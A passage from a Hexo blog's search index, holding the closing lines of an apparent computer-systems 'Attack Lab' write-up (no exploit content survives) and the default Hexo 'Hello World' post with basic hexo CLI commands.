class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>保存在touch_5.txt中，执行指令：</p><p><img src="/2021/07/02/Attack_lab/image-20210412213042512.png" alt="image-20210412213042512"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/07/02/hello-world/"/>
    <url>/2021/07/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="/2021/07/02/hello-world/image-20210704124553977.png" alt="image-20210704124553977"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
